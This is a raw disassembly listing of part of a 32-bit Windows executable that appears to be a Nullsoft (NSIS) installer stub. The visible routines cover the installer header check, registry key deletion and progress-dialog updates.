  402bd7:	53                   	push   %ebx
  402bd8:	ff 75 dc             	push   -0x24(%ebp)
  402bdb:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402bde:	50                   	push   %eax
  402bdf:	ff d6                	call   *%esi
  402be1:	85 c0                	test   %eax,%eax
  402be3:	7c 16                	jl     0x402bfb
  402be5:	ff 75 08             	push   0x8(%ebp)
  402be8:	ff 75 f4             	push   -0xc(%ebp)
  402beb:	e8 92 3a 00 00       	call   0x406682
  402bf0:	ff 75 08             	push   0x8(%ebp)
  402bf3:	ff 15 a0 82 40 00    	call   *0x4082a0
  402bf9:	eb 34                	jmp    0x402c2f
  402bfb:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402bfe:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402c05:	66 89 18             	mov    %bx,(%eax)
  402c08:	eb 25                	jmp    0x402c2f
  402c0a:	8b 0d 48 4f 42 00    	mov    0x424f48,%ecx
  402c10:	53                   	push   %ebx
  402c11:	23 c8                	and    %eax,%ecx
  402c13:	51                   	push   %ecx
  402c14:	6a 0b                	push   $0xb
  402c16:	ff 75 f8             	push   -0x8(%ebp)
  402c19:	ff 15 58 82 40 00    	call   *0x408258
  402c1f:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  402c22:	74 0b                	je     0x402c2f
  402c24:	53                   	push   %ebx
  402c25:	53                   	push   %ebx
  402c26:	ff 75 f8             	push   -0x8(%ebp)
  402c29:	ff 15 54 82 40 00    	call   *0x408254
  402c2f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402c32:	01 05 e8 9a 42 00    	add    %eax,0x429ae8
  402c38:	33 c0                	xor    %eax,%eax
  402c3a:	5f                   	pop    %edi
  402c3b:	5e                   	pop    %esi
  402c3c:	5b                   	pop    %ebx
  402c3d:	c9                   	leave
  402c3e:	c2 04 00             	ret    $0x4
  402c41:	3a 2c 40             	cmp    (%eax,%eax,2),%ch
  402c44:	00 91 14 40 00 9d    	add    %dl,-0x62ffbfec(%ecx)
  402c4a:	14 40                	adc    $0x40,%al
  402c4c:	00 b8 14 40 00 cb    	add    %bh,-0x34ffbfec(%eax)
  402c52:	14 40                	adc    $0x40,%al
  402c54:	00 d7                	add    %dl,%bh
  402c56:	14 40                	adc    $0x40,%al
  402c58:	00 f5                	add    %dh,%ch
  402c5a:	14 40                	adc    $0x40,%al
  402c5c:	00 78 15             	add    %bh,0x15(%eax)
  402c5f:	40                   	inc    %eax
  402c60:	00 a8 15 40 00 c6    	add    %ch,-0x39ffbfeb(%eax)
  402c66:	15 40 00 6f 16       	adc    $0x166f0040,%eax
  402c6b:	40                   	inc    %eax
  402c6c:	00 03                	add    %al,(%ebx)
  402c6e:	15 40 00 47 15       	adc    $0x15470040,%eax
  402c73:	40                   	inc    %eax
  402c74:	00 68 15             	add    %ch,0x15(%eax)
  402c77:	40                   	inc    %eax
  402c78:	00 80 16 40 00 d1    	add    %al,-0x2effbfea(%eax)
  402c7e:	16                   	push   %ss
  402c7f:	40                   	inc    %eax
  402c80:	00 3a                	add    %bh,(%edx)
  402c82:	17                   	pop    %ss
  402c83:	40                   	inc    %eax
  402c84:	00 61 17             	add    %ah,0x17(%ecx)
  402c87:	40                   	inc    %eax
  402c88:	00 74 17 40          	add    %dh,0x40(%edi,%edx,1)
  402c8c:	00 11                	add    %dl,(%ecx)
  402c8e:	19 40 00             	sbb    %eax,0x0(%eax)
  402c91:	14 19                	adc    $0x19,%al
  402c93:	40                   	inc    %eax
  402c94:	00 46 19             	add    %al,0x19(%esi)
  402c97:	40                   	inc    %eax
  402c98:	00 5b 19             	add    %bl,0x19(%ebx)
  402c9b:	40                   	inc    %eax
  402c9c:	00 6d 19             	add    %ch,0x19(%ebp)
  402c9f:	40                   	inc    %eax
  402ca0:	00 04 1a             	add    %al,(%edx,%ebx,1)
  402ca3:	40                   	inc    %eax
  402ca4:	00 35 1a 40 00 77    	add    %dh,0x7700401a
  402caa:	1a 40 00             	sbb    0x0(%eax),%al
  402cad:	b7 1a                	mov    $0x1a,%bh
  402caf:	40                   	inc    %eax
  402cb0:	00 7c 1b 40          	add    %bh,0x40(%ebx,%ebx,1)
  402cb4:	00 a0 1b 40 00 48    	add    %ah,0x4800401b(%eax)
  402cba:	1c 40                	sbb    $0x40,%al
  402cbc:	00 48 1c             	add    %cl,0x1c(%eax)
  402cbf:	40                   	inc    %eax
  402cc0:	00 1c 1d 40 00 3d 1d 	add    %bl,0x1d3d0040(,%ebx,1)
  402cc7:	40                   	inc    %eax
  402cc8:	00 62 1d             	add    %ah,0x1d(%edx)
  402ccb:	40                   	inc    %eax
  402ccc:	00 86 1d 40 00 53    	add    %al,0x5300401d(%esi)
  402cd2:	1e                   	push   %ds
  402cd3:	40                   	inc    %eax
  402cd4:	00 e3                	add    %ah,%bl
  402cd6:	1e                   	push   %ds
  402cd7:	40                   	inc    %eax
  402cd8:	00 17                	add    %dl,(%edi)
  402cda:	1f                   	pop    %ds
  402cdb:	40                   	inc    %eax
  402cdc:	00 a9 1f 40 00 fb    	add    %ch,-0x4ffbfe1(%ecx)
  402ce2:	1f                   	pop    %ds
  402ce3:	40                   	inc    %eax
  402ce4:	00 2f                	add    %ch,(%edi)
  402ce6:	20 40 00             	and    %al,0x0(%eax)
  402ce9:	dc 20                	fsubl  (%eax)
  402ceb:	40                   	inc    %eax
  402cec:	00 af 21 40 00 04    	add    %ch,0x4004021(%edi)
  402cf2:	23 40 00             	and    0x0(%eax),%eax
  402cf5:	88 23                	mov    %ah,(%ebx)
  402cf7:	40                   	inc    %eax
  402cf8:	00 b7 23 40 00 f9    	add    %dh,-0x6ffbfdd(%edi)
  402cfe:	23 40 00             	and    0x0(%eax),%eax
  402d01:	39 24 40             	cmp    %esp,(%eax,%eax,2)
  402d04:	00 8f 24 40 00 2f    	add    %cl,0x2f004024(%edi)
  402d0a:	25 40 00 a3 25       	and    $0x25a30040,%eax
  402d0f:	40                   	inc    %eax
  402d10:	00 0d 26 40 00 21    	add    %cl,0x21004026
  402d16:	26 40                	es inc %eax
  402d18:	00 43 26             	add    %al,0x26(%ebx)
  402d1b:	40                   	inc    %eax
  402d1c:	00 f1                	add    %dh,%cl
  402d1e:	26 40                	es inc %eax
  402d20:	00 94 28 40 00 c9 28 	add    %dl,0x28c90040(%eax,%ebp,1)
  402d27:	40                   	inc    %eax
  402d28:	00 e3                	add    %ah,%bl
  402d2a:	28 40 00             	sub    %al,0x0(%eax)
  402d2d:	10 29                	adc    %ch,(%ecx)
  402d2f:	40                   	inc    %eax
  402d30:	00 55 29             	add    %dl,0x29(%ebp)
  402d33:	40                   	inc    %eax
  402d34:	00 60 2a             	add    %ah,0x2a(%eax)
  402d37:	40                   	inc    %eax
  402d38:	00 f0                	add    %dh,%al
  402d3a:	2a 40 00             	sub    0x0(%eax),%al
  402d3d:	5e                   	pop    %esi
  402d3e:	2b 40 00             	sub    0x0(%eax),%eax
  402d41:	2f                   	das
  402d42:	2c 40                	sub    $0x40,%al
  402d44:	00 0a                	add    %cl,(%edx)
  402d46:	2c 40                	sub    $0x40,%al
  402d48:	00 43 26             	add    %al,0x26(%ebx)
  402d4b:	40                   	inc    %eax
  402d4c:	00 f1                	add    %dh,%cl
  402d4e:	26 40                	es inc %eax
  402d50:	00 e7                	add    %ah,%bh
  402d52:	1a 40 00             	sbb    0x0(%eax),%al
  402d55:	ee                   	out    %al,(%dx)
  402d56:	1a 40 00             	sbb    0x0(%eax),%al
  402d59:	f5                   	cmc
  402d5a:	1a 40 00             	sbb    0x0(%eax),%al
  402d5d:	fa                   	cli
  402d5e:	1a 40 00             	sbb    0x0(%eax),%al
  402d61:	0a 1b                	or     (%ebx),%bl
  402d63:	40                   	inc    %eax
  402d64:	00 0e                	add    %cl,(%esi)
  402d66:	1b 40 00             	sbb    0x0(%eax),%eax
  402d69:	12 1b                	adc    (%ebx),%bl
  402d6b:	40                   	inc    %eax
  402d6c:	00 1b                	add    %bl,(%ebx)
  402d6e:	1b 40 00             	sbb    0x0(%eax),%eax
  402d71:	24 1b                	and    $0x1b,%al
  402d73:	40                   	inc    %eax
  402d74:	00 31                	add    %dh,(%ecx)
  402d76:	1b 40 00             	sbb    0x0(%eax),%eax
  402d79:	41                   	inc    %ecx
  402d7a:	1b 40 00             	sbb    0x0(%eax),%eax
  402d7d:	5f                   	pop    %edi
  402d7e:	1b 40 00             	sbb    0x0(%eax),%eax
  402d81:	66 1b 40 00          	sbb    0x0(%eax),%ax
  402d85:	6d                   	insl   (%dx),%es:(%edi)
  402d86:	1b 40 00             	sbb    0x0(%eax),%eax
  402d89:	8b 44 24 04          	mov    0x4(%esp),%eax
  402d8d:	8b 0d 54 ce 40 00    	mov    0x40ce54,%ecx
  402d93:	56                   	push   %esi
  402d94:	ff 34 81             	push   (%ecx,%eax,4)
  402d97:	6a 00                	push   $0x0
  402d99:	e8 21 39 00 00       	call   0x4066bf
  402d9e:	8b f0                	mov    %eax,%esi
  402da0:	56                   	push   %esi
  402da1:	e8 3c 38 00 00       	call   0x4065e2
  402da6:	0f b7 16             	movzwl (%esi),%edx
  402da9:	5e                   	pop    %esi
  402daa:	c3                   	ret
  402dab:	56                   	push   %esi
  402dac:	8b 74 24 08          	mov    0x8(%esp),%esi
  402db0:	85 f6                	test   %esi,%esi
  402db2:	57                   	push   %edi
  402db3:	8b c6                	mov    %esi,%eax
  402db5:	7d 02                	jge    0x402db9
  402db7:	f7 d8                	neg    %eax
  402db9:	8b 15 54 ce 40 00    	mov    0x40ce54,%edx
  402dbf:	8b c8                	mov    %eax,%ecx
  402dc1:	83 e1 0f             	and    $0xf,%ecx
  402dc4:	c1 f8 04             	sar    $0x4,%eax
  402dc7:	ff 34 8a             	push   (%edx,%ecx,4)
  402dca:	c1 e0 0b             	shl    $0xb,%eax
  402dcd:	05 f8 a5 40 00       	add    $0x40a5f8,%eax
  402dd2:	50                   	push   %eax
  402dd3:	e8 e7 38 00 00       	call   0x4066bf
  402dd8:	85 f6                	test   %esi,%esi
  402dda:	8b f8                	mov    %eax,%edi
  402ddc:	7d 06                	jge    0x402de4
  402dde:	57                   	push   %edi
  402ddf:	e8 4c 3b 00 00       	call   0x406930
  402de4:	8b c7                	mov    %edi,%eax
  402de6:	5f                   	pop    %edi
  402de7:	5e                   	pop    %esi
  402de8:	c2 04 00             	ret    $0x4
  402deb:	55                   	push   %ebp
  402dec:	8b ec                	mov    %esp,%ebp
  402dee:	8d 45 08             	lea    0x8(%ebp),%eax
  402df1:	50                   	push   %eax
  402df2:	8b 45 08             	mov    0x8(%ebp),%eax
  402df5:	0d 20 00 10 00       	or     $0x100020,%eax
  402dfa:	50                   	push   %eax
  402dfb:	6a 22                	push   $0x22
  402dfd:	e8 a9 ff ff ff       	call   0x402dab
  402e02:	50                   	push   %eax
  402e03:	a1 54 ce 40 00       	mov    0x40ce54,%eax
  402e08:	ff 70 04             	push   0x4(%eax)
  402e0b:	e8 13 00 00 00       	call   0x402e23
  402e10:	50                   	push   %eax
  402e11:	e8 d9 36 00 00       	call   0x4064ef
  402e16:	f7 d8                	neg    %eax
  402e18:	1b c0                	sbb    %eax,%eax
  402e1a:	f7 d0                	not    %eax
  402e1c:	23 45 08             	and    0x8(%ebp),%eax
  402e1f:	5d                   	pop    %ebp
  402e20:	c2 04 00             	ret    $0x4
  402e23:	8b 44 24 04          	mov    0x4(%esp),%eax
  402e27:	85 c0                	test   %eax,%eax
  402e29:	7c 0d                	jl     0x402e38
  402e2b:	8b 0d e4 9a 42 00    	mov    0x429ae4,%ecx
  402e31:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402e38:	c2 04 00             	ret    $0x4
  402e3b:	55                   	push   %ebp
  402e3c:	8b ec                	mov    %esp,%ebp
  402e3e:	8d 45 10             	lea    0x10(%ebp),%eax
  402e41:	50                   	push   %eax
  402e42:	8b 45 10             	mov    0x10(%ebp),%eax
  402e45:	0d 20 00 10 00       	or     $0x100020,%eax
  402e4a:	50                   	push   %eax
  402e4b:	ff 75 0c             	push   0xc(%ebp)
  402e4e:	ff 75 08             	push   0x8(%ebp)
  402e51:	e8 cd ff ff ff       	call   0x402e23
  402e56:	50                   	push   %eax
  402e57:	e8 c1 36 00 00       	call   0x40651d
  402e5c:	f7 d8                	neg    %eax
  402e5e:	1b c0                	sbb    %eax,%eax
  402e60:	f7 d0                	not    %eax
  402e62:	23 45 10             	and    0x10(%ebp),%eax
  402e65:	5d                   	pop    %ebp
  402e66:	c2 0c 00             	ret    $0xc
  402e69:	55                   	push   %ebp
  402e6a:	8b ec                	mov    %esp,%ebp
  402e6c:	56                   	push   %esi
  402e6d:	8b 75 0c             	mov    0xc(%ebp),%esi
  402e70:	66 83 3e 00          	cmpw   $0x0,(%esi)
  402e74:	75 07                	jne    0x402e7d
  402e76:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402e7b:	eb 2c                	jmp    0x402ea9
  402e7d:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402e84:	8d 45 10             	lea    0x10(%ebp),%eax
  402e87:	50                   	push   %eax
  402e88:	ff 75 08             	push   0x8(%ebp)
  402e8b:	e8 93 ff ff ff       	call   0x402e23
  402e90:	50                   	push   %eax
  402e91:	e8 d8 35 00 00       	call   0x40646e
  402e96:	85 c0                	test   %eax,%eax
  402e98:	74 0c                	je     0x402ea6
  402e9a:	ff 75 10             	push   0x10(%ebp)
  402e9d:	56                   	push   %esi
  402e9e:	50                   	push   %eax
  402e9f:	e8 0a 00 00 00       	call   0x402eae
  402ea4:	eb 03                	jmp    0x402ea9
  402ea6:	6a 06                	push   $0x6
  402ea8:	58                   	pop    %eax
  402ea9:	5e                   	pop    %esi
  402eaa:	5d                   	pop    %ebp
  402eab:	c2 0c 00             	ret    $0xc
  402eae:	55                   	push   %ebp
  402eaf:	8b ec                	mov    %esp,%ebp
  402eb1:	81 ec 14 02 00 00    	sub    $0x214,%esp
  402eb7:	53                   	push   %ebx
  402eb8:	56                   	push   %esi
  402eb9:	8b 75 10             	mov    0x10(%ebp),%esi
  402ebc:	57                   	push   %edi
  402ebd:	8b fe                	mov    %esi,%edi
  402ebf:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ec2:	81 e6 00 03 00 00    	and    $0x300,%esi
  402ec8:	50                   	push   %eax
  402ec9:	8b c6                	mov    %esi,%eax
  402ecb:	83 e7 01             	and    $0x1,%edi
  402ece:	0c 09                	or     $0x9,%al
  402ed0:	50                   	push   %eax
  402ed1:	ff 75 0c             	push   0xc(%ebp)
  402ed4:	ff 75 08             	push   0x8(%ebp)
  402ed7:	e8 13 36 00 00       	call   0x4064ef
  402edc:	33 db                	xor    %ebx,%ebx
  402ede:	3b c3                	cmp    %ebx,%eax
  402ee0:	0f 85 ab 00 00 00    	jne    0x402f91
  402ee6:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402eea:	74 23                	je     0x402f0f
  402eec:	53                   	push   %ebx
  402eed:	53                   	push   %ebx
  402eee:	53                   	push   %ebx
  402eef:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402ef2:	53                   	push   %ebx
  402ef3:	50                   	push   %eax
  402ef4:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402efa:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402efd:	50                   	push   %eax
  402efe:	53                   	push   %ebx
  402eff:	ff 75 fc             	push   -0x4(%ebp)
  402f02:	ff 15 00 80 40 00    	call   *0x408000
  402f08:	3d 03 01 00 00       	cmp    $0x103,%eax
  402f0d:	75 67                	jne    0x402f76
  402f0f:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f15:	68 05 01 00 00       	push   $0x105
  402f1a:	50                   	push   %eax
  402f1b:	53                   	push   %ebx
  402f1c:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402f22:	eb 27                	jmp    0x402f4b
  402f24:	85 ff                	test   %edi,%edi
  402f26:	75 4e                	jne    0x402f76
  402f28:	ff 75 10             	push   0x10(%ebp)
  402f2b:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f31:	50                   	push   %eax
  402f32:	ff 75 fc             	push   -0x4(%ebp)
  402f35:	e8 74 ff ff ff       	call   0x402eae
  402f3a:	85 c0                	test   %eax,%eax
  402f3c:	75 16                	jne    0x402f54
  402f3e:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
  402f44:	68 05 01 00 00       	push   $0x105
  402f49:	50                   	push   %eax
  402f4a:	57                   	push   %edi
  402f4b:	ff 75 fc             	push   -0x4(%ebp)
  402f4e:	ff d3                	call   *%ebx
  402f50:	85 c0                	test   %eax,%eax
  402f52:	74 d0                	je     0x402f24
  402f54:	ff 75 fc             	push   -0x4(%ebp)
  402f57:	ff 15 10 80 40 00    	call   *0x408010
  402f5d:	6a 03                	push   $0x3
  402f5f:	e8 12 3b 00 00       	call   0x406a76
  402f64:	85 c0                	test   %eax,%eax
  402f66:	75 1e                	jne    0x402f86
  402f68:	ff 75 0c             	push   0xc(%ebp)
  402f6b:	ff 75 08             	push   0x8(%ebp)
  402f6e:	ff 15 18 80 40 00    	call   *0x408018
  402f74:	eb 1b                	jmp    0x402f91
  402f76:	ff 75 fc             	push   -0x4(%ebp)
  402f79:	ff 15 10 80 40 00    	call   *0x408010
  402f7f:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402f84:	eb 0b                	jmp    0x402f91
  402f86:	6a 00                	push   $0x0
  402f88:	56                   	push   %esi
  402f89:	ff 75 0c             	push   0xc(%ebp)
  402f8c:	ff 75 08             	push   0x8(%ebp)
  402f8f:	ff d0                	call   *%eax
  402f91:	5f                   	pop    %edi
  402f92:	5e                   	pop    %esi
  402f93:	5b                   	pop    %ebx
  402f94:	c9                   	leave
  402f95:	c2 0c 00             	ret    $0xc
  402f98:	55                   	push   %ebp
  402f99:	8b ec                	mov    %esp,%ebp
  402f9b:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402fa1:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402fa8:	75 19                	jne    0x402fc3
  402faa:	6a 00                	push   $0x0
  402fac:	68 fa 00 00 00       	push   $0xfa
  402fb1:	6a 01                	push   $0x1
  402fb3:	ff 75 08             	push   0x8(%ebp)
  402fb6:	ff 15 18 82 40 00    	call   *0x408218
  402fbc:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402fc3:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402fca:	75 45                	jne    0x403011
  402fcc:	e8 46 00 00 00       	call   0x403017
  402fd1:	83 3d 70 9a 42 00 00 	cmpl   $0x0,0x429a70
  402fd8:	b9 54 a0 40 00       	mov    $0x40a054,%ecx
  402fdd:	75 05                	jne    0x402fe4
  402fdf:	b9 20 a0 40 00       	mov    $0x40a020,%ecx
  402fe4:	50                   	push   %eax
  402fe5:	8d 45 80             	lea    -0x80(%ebp),%eax
  402fe8:	51                   	push   %ecx
  402fe9:	50                   	push   %eax
  402fea:	ff 15 2c 82 40 00    	call   *0x40822c
  402ff0:	83 c4 0c             	add    $0xc,%esp
  402ff3:	8d 45 80             	lea    -0x80(%ebp),%eax
  402ff6:	50                   	push   %eax
  402ff7:	ff 75 08             	push   0x8(%ebp)
  402ffa:	ff 15 1c 82 40 00    	call   *0x40821c
  403000:	8d 45 80             	lea    -0x80(%ebp),%eax
  403003:	50                   	push   %eax
  403004:	68 06 04 00 00       	push   $0x406
  403009:	ff 75 08             	push   0x8(%ebp)
  40300c:	e8 af 2c 00 00       	call   0x405cc0
  403011:	33 c0                	xor    %eax,%eax
  403013:	c9                   	leave
  403014:	c2 10 00             	ret    $0x10
  403017:	8b 0d f0 0e 42 00    	mov    0x420ef0,%ecx
  40301d:	a1 00 0f 42 00       	mov    0x420f00,%eax
  403022:	3b c8                	cmp    %eax,%ecx
  403024:	72 02                	jb     0x403028
  403026:	8b c8                	mov    %eax,%ecx
  403028:	50                   	push   %eax
  403029:	6a 64                	push   $0x64
  40302b:	51                   	push   %ecx
  40302c:	ff 15 48 81 40 00    	call   *0x408148
  403032:	c3                   	ret
  403033:	55                   	push   %ebp
  403034:	8b ec                	mov    %esp,%ebp
  403036:	81 ec 80 00 00 00    	sub    $0x80,%esp
  40303c:	56                   	push   %esi
  40303d:	33 f6                	xor    %esi,%esi
  40303f:	39 75 08             	cmp    %esi,0x8(%ebp)
  403042:	74 18                	je     0x40305c
  403044:	a1 fc 0e 42 00       	mov    0x420efc,%eax
  403049:	3b c6                	cmp    %esi,%eax
  40304b:	74 07                	je     0x403054
  40304d:	50                   	push   %eax
  40304e:	ff 15 10 82 40 00    	call   *0x408210
  403054:	89 35 fc 0e 42 00    	mov    %esi,0x420efc
  40305a:	eb 76                	jmp    0x4030d2
  40305c:	39 35 fc 0e 42 00    	cmp    %esi,0x420efc
  403062:	74 08                	je     0x40306c
  403064:	56                   	push   %esi
  403065:	e8 48 3a 00 00       	call   0x406ab2
  40306a:	eb 66                	jmp    0x4030d2
  40306c:	ff 15 d0 80 40 00    	call   *0x4080d0
  403072:	3b 05 6c 9a 42 00    	cmp    0x429a6c,%eax
  403078:	76 58                	jbe    0x4030d2
  40307a:	39 35 68 9a 42 00    	cmp    %esi,0x429a68
  403080:	74 2d                	je     0x4030af
  403082:	f6 05 14 9b 42 00 01 	testb  $0x1,0x429b14
  403089:	74 47                	je     0x4030d2
  40308b:	e8 87 ff ff ff       	call   0x403017
  403090:	50                   	push   %eax
  403091:	8d 45 80             	lea    -0x80(%ebp),%eax
  403094:	68 80 a0 40 00       	push   $0x40a080
  403099:	50                   	push   %eax
  40309a:	ff 15 2c 82 40 00    	call   *0x40822c
  4030a0:	83 c4 0c             	add    $0xc,%esp
  4030a3:	8d 45 80             	lea    -0x80(%ebp),%eax
  4030a6:	50                   	push   %eax
  4030a7:	56                   	push   %esi
  4030a8:	e8 5a 26 00 00       	call   0x405707
  4030ad:	eb 23                	jmp    0x4030d2
  4030af:	56                   	push   %esi
  4030b0:	68 98 2f 40 00       	push   $0x402f98
  4030b5:	56                   	push   %esi
  4030b6:	6a 6f                	push   $0x6f
  4030b8:	ff 35 60 9a 42 00    	push   0x429a60
  4030be:	ff 15 14 82 40 00    	call   *0x408214
  4030c4:	6a 05                	push   $0x5
  4030c6:	50                   	push   %eax
  4030c7:	a3 fc 0e 42 00       	mov    %eax,0x420efc
  4030cc:	ff 15 28 82 40 00    	call   *0x408228
  4030d2:	5e                   	pop    %esi
  4030d3:	c9                   	leave
  4030d4:	c3                   	ret
  4030d5:	55                   	push   %ebp
  4030d6:	8b ec                	mov    %esp,%ebp
  4030d8:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  4030de:	53                   	push   %ebx
  4030df:	56                   	push   %esi
  4030e0:	33 db                	xor    %ebx,%ebx
  4030e2:	57                   	push   %edi
  4030e3:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4030e6:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4030e9:	ff 15 d0 80 40 00    	call   *0x4080d0
  4030ef:	be 00 78 43 00       	mov    $0x437800,%esi
  4030f4:	68 00 04 00 00       	push   $0x400
  4030f9:	05 e8 03 00 00       	add    $0x3e8,%eax
  4030fe:	56                   	push   %esi
  4030ff:	53                   	push   %ebx
  403100:	a3 6c 9a 42 00       	mov    %eax,0x429a6c
  403105:	ff 15 c4 80 40 00    	call   *0x4080c4
  40310b:	6a 03                	push   $0x3
  40310d:	68 00 00 00 80       	push   $0x80000000
  403112:	56                   	push   %esi
  403113:	e8 5a 30 00 00       	call   0x406172
  403118:	8b f8                	mov    %eax,%edi
  40311a:	83 ff ff             	cmp    $0xffffffff,%edi
  40311d:	89 3d 18 a0 40 00    	mov    %edi,0x40a018
  403123:	75 0a                	jne    0x40312f
  403125:	b8 b8 a2 40 00       	mov    $0x40a2b8,%eax
  40312a:	e9 40 02 00 00       	jmp    0x40336f
  40312f:	56                   	push   %esi
  403130:	be 00 58 43 00       	mov    $0x435800,%esi
  403135:	56                   	push   %esi
  403136:	e8 47 35 00 00       	call   0x406682
  40313b:	56                   	push   %esi
  40313c:	e8 5c 2e 00 00       	call   0x405f9d
  403141:	50                   	push   %eax
  403142:	68 00 80 43 00       	push   $0x438000
  403147:	e8 36 35 00 00       	call   0x406682
  40314c:	53                   	push   %ebx
  40314d:	57                   	push   %edi
  40314e:	ff 15 c8 80 40 00    	call   *0x4080c8
  403154:	3b c3                	cmp    %ebx,%eax
  403156:	a3 00 0f 42 00       	mov    %eax,0x420f00
  40315b:	8b f0                	mov    %eax,%esi
  40315d:	0f 86 e5 00 00 00    	jbe    0x403248
  403163:	bb f0 8e 41 00       	mov    $0x418ef0,%ebx
  403168:	a1 74 9a 42 00       	mov    0x429a74,%eax
  40316d:	8b fe                	mov    %esi,%edi
  40316f:	f7 d8                	neg    %eax
  403171:	1b c0                	sbb    %eax,%eax
  403173:	25 00 7e 00 00       	and    $0x7e00,%eax
  403178:	05 00 02 00 00       	add    $0x200,%eax
  40317d:	3b f0                	cmp    %eax,%esi
  40317f:	72 02                	jb     0x403183
  403181:	8b f8                	mov    %eax,%edi
  403183:	57                   	push   %edi
  403184:	53                   	push   %ebx
  403185:	e8 5d 04 00 00       	call   0x4035e7
  40318a:	85 c0                	test   %eax,%eax
  40318c:	0f 84 51 01 00 00    	je     0x4032e3
  403192:	83 3d 74 9a 42 00 00 	cmpl   $0x0,0x429a74
  403199:	75 7a                	jne    0x403215
  40319b:	6a 1c                	push   $0x1c
  40319d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4031a0:	53                   	push   %ebx
  4031a1:	50                   	push   %eax
  4031a2:	e8 86 2f 00 00       	call   0x40612d
  4031a7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4031aa:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  4031af:	75 72                	jne    0x403223
  4031b1:	81 7d e0 ef be ad de 	cmpl   $0xdeadbeef,-0x20(%ebp)
  4031b8:	75 69                	jne    0x403223
  4031ba:	81 7d ec 49 6e 73 74 	cmpl   $0x74736e49,-0x14(%ebp)
  4031c1:	75 60                	jne    0x403223
  4031c3:	81 7d e8 73 6f 66 74 	cmpl   $0x74666f73,-0x18(%ebp)
  4031ca:	75 57                	jne    0x403223
  4031cc:	81 7d e4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x1c(%ebp)
  4031d3:	75 4e                	jne    0x403223
  4031d5:	09 45 08             	or     %eax,0x8(%ebp)
  4031d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4031db:	8b 0d f0 0e 42 00    	mov    0x420ef0,%ecx
  4031e1:	83 e0 02             	and    $0x2,%eax
  4031e4:	09 05 00 9b 42 00    	or     %eax,0x429b00
  4031ea:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4031ed:	3b c6                	cmp    %esi,%eax
  4031ef:	89 0d 74 9a 42 00    	mov    %ecx,0x429a74
  4031f5:	0f 87 2c 01 00 00    	ja     0x403327
  4031fb:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4031ff:	75 06                	jne    0x403207
  403201:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  403205:	75 3f                	jne    0x403246
  403207:	ff 45 f8             	incl   -0x8(%ebp)
  40320a:	8d 70 fc             	lea    -0x4(%eax),%esi
  40320d:	3b fe                	cmp    %esi,%edi
  40320f:	76 12                	jbe    0x403223
  403211:	8b fe                	mov    %esi,%edi
  403213:	eb 0e                	jmp    0x403223
  403215:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  403219:	75 08                	jne    0x403223
  40321b:	6a 00                	push   $0x0
  40321d:	e8 11 fe ff ff       	call   0x403033
  403222:	59                   	pop    %ecx
  403223:	3b 35 00 0f 42 00    	cmp    0x420f00,%esi
  403229:	73 0d                	jae    0x403238
  40322b:	57                   	push   %edi
  40322c:	53                   	push   %ebx
  40322d:	ff 75 fc             	push   -0x4(%ebp)
  403230:	e8 2e 39 00 00       	call   0x406b63
  403235:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403238:	01 3d f0 0e 42 00    	add    %edi,0x420ef0
  40323e:	2b f7                	sub    %edi,%esi
  403240:	0f 85 22 ff ff ff    	jne    0x403168
  403246:	33 db                	xor    %ebx,%ebx
  403248:	6a 01                	push   $0x1
  40324a:	e8 e4 fd ff ff       	call   0x403033
  40324f:	39 1d 74 9a 42 00    	cmp    %ebx,0x429a74
  403255:	59                   	pop    %ecx
  403256:	0f 84 cb 00 00 00    	je     0x403327
  40325c:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40325f:	74 2a                	je     0x40328b
  403261:	ff 35 f0 0e 42 00    	push   0x420ef0
  403267:	e8 91 03 00 00       	call   0x4035fd
  40326c:	8d 45 08             	lea    0x8(%ebp),%eax
  40326f:	6a 04                	push   $0x4
  403271:	50                   	push   %eax
  403272:	e8 70 03 00 00       	call   0x4035e7
  403277:	85 c0                	test   %eax,%eax
  403279:	0f 84 a8 00 00 00    	je     0x403327
  40327f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403282:	3b 45 08             	cmp    0x8(%ebp),%eax
  403285:	0f 85 9c 00 00 00    	jne    0x403327
  40328b:	ff 75 f0             	push   -0x10(%ebp)
  40328e:	6a 40                	push   $0x40
  403290:	ff 15 10 81 40 00    	call   *0x408110
  403296:	b9 68 ce 40 00       	mov    $0x40ce68,%ecx
  40329b:	8b f0                	mov    %eax,%esi
  40329d:	e8 2f 39 00 00       	call   0x406bd1
  4032a2:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4032a8:	68 00 68 43 00       	push   $0x436800
  4032ad:	50                   	push   %eax
